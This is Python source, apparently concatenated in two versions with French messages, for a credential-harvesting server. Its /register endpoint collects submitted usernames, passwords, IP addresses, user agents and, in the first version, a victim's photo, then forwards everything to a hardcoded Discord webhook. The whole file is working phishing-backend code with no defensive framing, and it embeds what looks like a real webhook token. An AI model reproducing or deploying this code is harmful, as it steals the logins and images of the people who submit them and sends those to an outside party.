from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import datetime
import urllib.request
import base64
import uuid

WEBHOOK_URL = "https://discord.com/api/webhooks/1532553921095270530/dP3FzsnMbetZfkPN3HuRAkDY_xNCgfNekonHwPoE4F_MQRmA-6v6-BC5hWbnBc2mmWK"

class MyHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/register':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))

            print("[+] Nouvelles données reçues :", data.get('username'))

            now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            ip = data.get('ip', 'Non détectée')

            msg = (
                f"--- NOUVELLE CONNEXION [{now}] ---\n"
                f"Utilisateur : {data.get('username')}\n"
                f"Mot de passe : {data.get('password')}\n"
                f"Adresse IP : {ip}\n"
                f"Localisation IP : https://ip-api.com/#{ip}\n"
                f"User-Agent : {data.get('userAgent')}"
            )

            # Préparation de l'envoi multipart (texte + photo)
            photo_b64 = data.get('photo')
            boundary = f"----WebKitFormBoundary{uuid.uuid4().hex}"
            body = bytearray()

            # Partie texte / payload Discord
            payload_json = json.dumps({"content": msg})
            body.extend(f"--{boundary}\r\n".encode('utf-8'))
            body.extend(b'Content-Disposition: form-data; name="payload_json"\r\n')
            body.extend(b'Content-Type: application/json\r\n\r\n')
            body.extend(payload_json.encode('utf-8'))
            body.extend(b'\r\n')

            # Partie photo si disponible
            if photo_b64 and ',' in photo_b64:
                try:
                    img_bytes = base64.b64decode(photo_b64.split(',')[1])
                    body.extend(f"--{boundary}\r\n".encode('utf-8'))
                    body.extend(b'Content-Disposition: form-data; name="file"; filename="photo.jpg"\r\n')
                    body.extend(b'Content-Type: image/jpeg\r\n\r\n')
                    body.extend(img_bytes)
                    body.extend(b'\r\n')
                except Exception as e:
                    print("Erreur décodage image :", e)

            body.extend(f"--{boundary}--\r\n".encode('utf-8'))

            req = urllib.request.Request(
                WEBHOOK_URL,
                data=bytes(body),
                headers={
                    'Content-Type': f'multipart/form-data; boundary={boundary}',
                    'User-Agent': 'Mozilla/5.0'
                }
            )

            try:
                urllib.request.urlopen(req)
            except Exception as e:
                print("Erreur envoi Discord:", e)

            # Réponse au navigateur
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
        else:
            self.send_error(404, "Page non trouvée")

server_address = ('', 8080)
httpd = HTTPServer(server_address, MyHandler)
print("Serveur lancé sur le port 8080...")
httpd.serve_forever()
from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import datetime
import urllib.request

WEBHOOK_URL = "https://discord.com/api/webhooks/1532553921095270530/dP3FzsnWbetZfkPN3HuRAKDY_xNCgfNekonHwEPoE4F_MQRmA-6v6-BC5hWbmBc2mmWK"

class MyHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/register':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))

            # Affichage dans la console
            print("[+] Nouvelles données reçues :", data)

            # Horodatage de la réception
            now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            # Envoi vers Discord
            msg = (
        f"--- NOUVELLE CONNEXION [{now}] ---\n"
        f"Utilisateur : {data.get('username')}\n"
        f"Mot de passe : {data.get('password')}\n"
        f"Adresse IP : {data.get('ip')}\n"
        f"Localisation IP : https://ip-api.com/#{data.get('ip')}\n"
        f"User-Agent : {data.get('userAgent')}"
    )
            payload = json.dumps({"content": msg}).encode('utf-8')
            req = urllib.request.Request(WEBHOOK_URL, data=payload, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'})
            try:
                urllib.request.urlopen(req)
            except Exception as e:
                print("Erreur envoi Discord:", e)

            # Réponse JSON envoyée au navigateur
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
        else:
            self.send_error(404, "Page non trouvée")

# Lancement du serveur
server_address = ('', 8080)
httpd = HTTPServer(server_address, MyHandler)
print("Serveur lancé avec succès sur le port 8080...")
httpd.serve_forever()
